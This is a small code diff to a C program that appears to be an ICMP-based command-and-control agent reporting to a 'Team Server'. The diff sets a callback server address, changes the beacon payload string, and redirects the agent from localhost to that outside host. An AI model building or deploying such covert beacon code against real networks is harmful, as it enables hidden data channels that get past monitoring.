@@ -105,6 +105,7 @@ passes data to Team Server
 //size of payload/data section of icmp.
 //ideally, the program will do the math & figure out how to chunk messages based on this size. Currently, it does not
 #define ICMP_PAYLOAD_SIZE 32
+#define ICMP_CALLBACK_SERVER "8.8.8.8"
 
 
 struct icmp_header {
@@ -143,7 +144,7 @@ int send_icmp(SOCKET s, struct sockaddr_in* dest) {
 
 
     char* data = packet + sizeof(struct icmp_header);
-    strcpy_s(data, ICMP_PAYLOAD_SIZE, "This is a test ICMP payload");
+    strcpy_s(data, ICMP_PAYLOAD_SIZE, "ShmingusBingus");
 
     icmp->Checksum = 0;
     icmp->Checksum = checksum((USHORT*)packet, sizeof(packet));
@@ -209,7 +210,7 @@ void recv_icmp(SOCKET s) {
 
 int main() {
     printf("[+] ICMP WIN\n");
-    const char* SERVER_IP = "127.0.0.1";
+    const char* SERVER_IP = ICMP_CALLBACK_SERVER;
     printf("[+] SERVER: %s\n", SERVER_IP);
 
     WSADATA wsaData;
